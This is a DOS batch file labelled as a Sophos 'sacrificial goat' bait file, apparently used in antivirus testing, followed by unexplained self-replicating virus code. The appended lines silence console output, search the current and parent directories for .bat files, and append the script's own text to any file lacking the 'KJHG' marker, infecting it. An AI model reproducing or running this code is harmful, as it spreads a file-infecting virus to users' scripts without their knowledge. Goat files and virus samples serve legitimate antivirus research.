@REM ------- BEGIN OF SOPHOS GOAT ------
@ECHO Sophos Ltd, Oxford sacrificial BAT goat 300 bytes long
@REM ***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***
@REM ***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS***
@REM ------- END OF SOPHOS GOAT -------
Y
@ctty nul
for %%q in (*.bat ..\*.bat) do set KJHG=%%q
for %%t in (*.bat ..\*.bat) do if %KJHG% == "AUTOEXEC.BAT" goto en
find "KJHG" %KJHG%
if errorlevel 1 type %0 >> %KJHG%
:en
